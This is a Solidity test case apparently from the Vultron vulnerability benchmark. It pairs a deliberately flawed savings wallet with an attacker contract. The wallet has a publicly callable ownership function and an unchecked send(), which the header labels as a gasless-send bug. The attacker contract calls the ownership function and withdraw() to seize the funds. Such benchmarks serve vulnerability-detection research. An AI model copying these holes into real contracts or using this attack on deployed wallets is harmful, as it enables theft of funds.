/*
 * @source: https://github.com/ntu-SRSLab/vultron/blob/master/benchmark/gaslesssend/CreditDepositBank/
 * @author: Vultron
 * @vulnerable_at_lines: 30
 */

pragma solidity >=0.7.0;
// testing
contract HelpMeSave { 
   //wallet that forces me to save, until i have reached my goal
    address payable public owner; //me
   
   //Construct
   function MyTestWallet7() public{
       owner = payable(msg.sender);   // store owner
   }
   
    function deposit() public payable{}
    receive() external payable {deposit();}
    
    // I can only use this once I have reached my goal   
    function withdraw () public noone_else { 

         uint256 withdraw_amt = address(this).balance;
         
         if (msg.sender != owner || withdraw_amt < 100 ether) { //0 ether ){ // someone else tries to withdraw, NONONO!!!
             withdraw_amt = 0;                     // or target savings not reached
         }
         // <yes> <report> Gasless_Send
         payable(msg.sender).send(withdraw_amt); // ok send it back to me
         
   }

    modifier noone_else() {
        if (msg.sender == owner) 
            _;
    }
}


contract Attack_HelpMeSave0 {

    HelpMeSave public target_contract;

    constructor(address payable _targetContract) public payable {
        target_contract = HelpMeSave(_targetContract);
    } 

    function vultron_MyTestWallet7() public {
    target_contract.MyTestWallet7();
    } 

    function vultron_withdraw() public {
    target_contract.withdraw();
    } 

    function vultron_deposit(uint256 vultron_amount) public payable{
    target_contract.deposit{value:vultron_amount}();
    } 

    receive() external payable {
        target_contract.MyTestWallet7();
    }
} 